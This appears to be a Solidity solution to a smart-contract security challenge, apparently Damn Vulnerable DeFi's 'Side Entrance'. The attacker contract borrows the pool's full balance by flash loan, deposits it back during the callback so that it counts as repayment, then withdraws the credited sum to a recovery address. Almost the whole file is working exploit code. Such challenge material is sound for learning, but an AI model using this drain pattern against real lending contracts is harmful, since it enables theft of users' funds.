// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;
import "forge-std/Test.sol";

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}


contract AttackerContract {
    ISideEntranceLenderPool private pool;
    address private owner;
    address private recovery;

    constructor(address _poolAddress, address _recoveryAddress) {
        pool = ISideEntranceLenderPool(_poolAddress);
        owner = msg.sender;
        recovery = _recoveryAddress;
    }

    function attack() external {
        require(msg.sender == owner, "Only owner can attack");  
        uint256 amount = address(pool).balance;
        console.log("--------- Attack started ---------");
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        console.log("--------- Execute callback triggered ---------");
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        (bool success,)= recovery.call{value: msg.value}("");
        require(success, "Transfer to recovery failed");
        console.log("--------- Attack completed ---------");
    }



}